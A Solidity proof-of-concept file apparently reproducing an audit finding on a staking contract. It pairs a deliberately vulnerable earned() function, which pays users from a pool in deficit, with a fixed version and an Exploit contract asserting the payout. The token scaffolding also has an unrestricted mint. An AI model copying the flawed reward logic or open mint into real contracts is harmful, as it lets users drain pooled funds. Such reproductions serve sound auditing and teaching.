// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Coinflip Staking.earned (Pashov, 2025-02).
    Alice staked 10 of 100. The contract holds 80. Her share of the
    remaining balance is 8. earned returns 8 because the pool is in
    deficit. The quoted fix returns 0. giveReward then pays that 8.
*/

contract Token {
    string public symbol = "FLIP";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Staking {
    Token public token;
    mapping(address => uint256) public stakedBalances;
    uint256 public totalStaked;
    bool public accepted = true;
    uint256 public lastBalance;
    uint256 public lastShare;
    bool public inDeficit;
    uint256 public lastReward;
    uint256 public paid;

    constructor(Token _token) {
        token = _token;
    }

    function seed(address user, uint256 staked, uint256 total, uint256 bal) external {
        stakedBalances[user] = staked;
        totalStaked = total;
        token.mint(address(this), bal);
    }

    // Quoted earned. A deficit returns the user's share of what is left.
    function earned(address user) public returns (uint256) {
        require(accepted, "Token not supported");
        if (totalStaked == 0) return 0;
        uint256 totalTokenBalance = token.balanceOf(address(this));
        lastBalance = totalTokenBalance;
        uint256 userShare = stakedBalances[user] * 1e18 / totalStaked * totalTokenBalance / 1e18;
        lastShare = userShare;
        if (totalTokenBalance < totalStaked) {
            inDeficit = true;
            return userShare; // @> VULN: a loss still pays the user their share of the remaining balance
        }
        uint256 staked = stakedBalances[user];
        return userShare > staked ? userShare - staked : 0;
    }

    function giveReward(address user) external returns (uint256 reward) {
        reward = earned(user);
        lastReward = reward;
        if (reward > 0) token.transfer(user, reward);
        paid = reward;
    }
}

contract StakingFixed {
    Token public token;
    mapping(address => uint256) public stakedBalances;
    uint256 public totalStaked;
    bool public accepted = true;

    constructor(Token _token) {
        token = _token;
    }

    function seed(address user, uint256 staked, uint256 total, uint256 bal) external {
        stakedBalances[user] = staked;
        totalStaked = total;
        token.mint(address(this), bal);
    }

    function earned(address user) public view returns (uint256) {
        require(accepted, "Token not supported");
        if (totalStaked == 0) return 0;
        uint256 totalTokenBalance = token.balanceOf(address(this));
        if (totalTokenBalance < totalStaked) return 0;
        uint256 userShare = stakedBalances[user] * 1e18 / totalStaked * totalTokenBalance / 1e18;
        uint256 staked = stakedBalances[user];
        return userShare > staked ? userShare - staked : 0;
    }

    function giveReward(address user) external returns (uint256 reward) {
        reward = earned(user);
        if (reward > 0) token.transfer(user, reward);
    }
}

contract Exploit {
    uint256 public constant ALICE = 10 ether;
    uint256 public constant TOTAL = 100 ether;
    uint256 public constant BALANCE = 80 ether;
    address public constant ALICE_ADDR = 0x1111111111111111111111111111111111111111;

    Token public token;
    Staking public staking;

    function run() external {
        token = new Token();
        staking = new Staking(token);
        staking.seed(ALICE_ADDR, ALICE, TOTAL, BALANCE);
        uint256 reward = staking.earned(ALICE_ADDR);
        require(reward == 8 ether, "deficit still earns 8");
        uint256 paid = staking.giveReward(ALICE_ADDR);
        require(paid == 8 ether, "paid 8");
        require(token.balanceOf(ALICE_ADDR) == 8 ether, "alice received 8");
        require(token.balanceOf(address(staking)) == 72 ether, "pool left 72");
    }
}
